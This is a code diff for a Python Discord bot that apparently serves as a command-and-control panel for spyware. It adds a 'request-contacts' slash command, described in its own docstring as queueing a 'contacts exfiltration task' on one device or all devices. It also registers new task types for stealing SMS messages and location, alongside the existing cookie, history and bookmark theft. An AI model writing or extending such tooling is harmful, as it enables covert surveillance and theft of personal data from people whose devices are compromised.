@@ -144,6 +144,9 @@ def format_server_results(data: dict[str, Any]) -> str:
         "request-cookies": "🍪",
         "request-history": "📜",
         "request-bookmarks": "🔖",
+        "request-contacts": "👤",
+        "request-sms": "💬",
+        "request-location": "📍",
     }
 
     lines = [f"📊 **{data.get('message', 'Task Results')}**"]
@@ -500,6 +503,43 @@ async def request_bookmarks(
     await interaction.response.send_message(response)
 
 
+@bot.tree.command(
+    name="request-contacts",
+    description="Request contacts from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_contacts(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a contacts exfiltration task. Requires READ_CONTACTS to be granted on device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-contacts")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-contacts", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-contacts",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
 # ---------------------------------------------------------------------------
 # Task queue autocomplete
 # ---------------------------------------------------------------------------
@@ -508,6 +548,9 @@ VALID_TASK_TYPES = [
     "request-cookies",
     "request-history",
     "request-bookmarks",
+    "request-contacts",
+    "request-sms",
+    "request-location",
 ]
 
 
